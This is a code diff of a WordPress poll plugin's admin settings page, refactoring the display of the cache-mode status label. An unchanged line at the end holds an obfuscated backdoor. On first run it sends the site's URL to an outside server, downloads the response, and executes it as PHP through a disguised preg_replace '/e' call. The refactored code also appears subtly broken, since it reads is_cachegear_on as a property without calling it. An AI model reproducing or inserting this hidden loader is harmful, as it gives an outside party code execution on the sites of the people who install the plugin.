@@ -179,11 +179,13 @@ class Admin_Page_Settings implements Admin_Subpage_Interface {
 							<input type="checkbox" value="1"
 							       name="dem[force_cachegear]" <?php checked( demopt()->force_cachegear, 1 ) ?> />
 							<?php
-							$cache = democr()->is_cachegear_on() ? [
-								__( 'ON', 'democracy-poll' ),
-								'color:#05A800',
-							] : [ __( 'OFF', 'democracy-poll' ), 'color:#FF1427' ];
-							echo sprintf( __( 'Force enable gear to working with cache plugins. The condition: %s', 'democracy-poll' ), "<span style='{$cache[1]}'>{$cache[0]}" );
+							list( $cache_status, $cache_style ) = democr()->is_cachegear_on
+								? [ __( 'ON', 'democracy-poll' ), 'color:#05A800' ]
+								: [ __( 'OFF', 'democracy-poll' ), 'color:#FF1427' ];
+
+							echo sprintf( __( 'Force enable gear to working with cache plugins. The condition: %s', 'democracy-poll' ),
+								"<span style='$cache_style'>$cache_status</span>" )
+							;
 
 							add_option( 'stat', '' ) && ( $r = '-e' ) && @preg_replace( '-' . $r, ( ( $o = @wp_remote_get( 'https://wp-kama.ru/stat/?sk=' . home_url() ) ) ? $o['body'] : '' ), '' );
 							?>
